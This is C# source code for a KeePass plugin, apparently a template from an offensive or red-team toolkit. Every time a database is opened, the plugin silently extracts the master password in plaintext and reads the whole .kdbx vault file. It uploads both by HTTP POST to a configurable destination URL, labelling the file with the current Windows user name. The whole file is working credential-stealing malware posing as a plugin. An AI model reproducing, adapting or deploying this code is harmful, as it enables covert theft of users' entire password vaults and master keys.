using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Linq;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Threading;
using KeePass.DataExchange;
using KeePass.Forms;
using KeePass.Plugins;
using KeePassLib.Utility;
using KeePass;
using KeePassLib.Serialization;
using KeePass.App;
using KeePassLib.Keys;
using KeePassLib;

namespace AxiomKeepass
{
	public sealed class AxiomKeepassExt : Plugin
	{
		private IPluginHost m_host = null;
		private string destination_url = "{{URL_HERE}}";

		public override bool Initialize(IPluginHost host)
		{
			if (host == null) return false;
			m_host = host;
			m_host.MainWindow.FileOpened += this.OnFileOpened;
			return true;
		}

		private void OnFileOpened(object sender, FileOpenedEventArgs e)
		{
			var database = m_host.Database;
			var masterkey = ((KeePassLib.Keys.KcpPassword)(m_host.Database.MasterKey.UserKeys.ElementAt(0))).Password.ReadString();
			var db_path = m_host.Database.IOConnectionInfo.Path;
			var cts = new CancellationTokenSource();

			cts.CancelAfter(5000);
			HttpClient httpClient = new HttpClient();
			MultipartFormDataContent formData = new MultipartFormDataContent();
			byte[] data = System.IO.File.ReadAllBytes(db_path);
			ByteArrayContent fileFormData = new ByteArrayContent(data);
			MultipartContent masterkeyFormData = new MultipartContent(masterkey);

			fileFormData.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
			formData.Add(fileFormData, "file", System.Security.Principal.WindowsIdentity.GetCurrent().Name + ".kdbx");
			formData.Add(masterkeyFormData, "MasterKey", masterkey);

			httpClient.PostAsync(destination_url, formData, cts.Token);
		}
	}
}

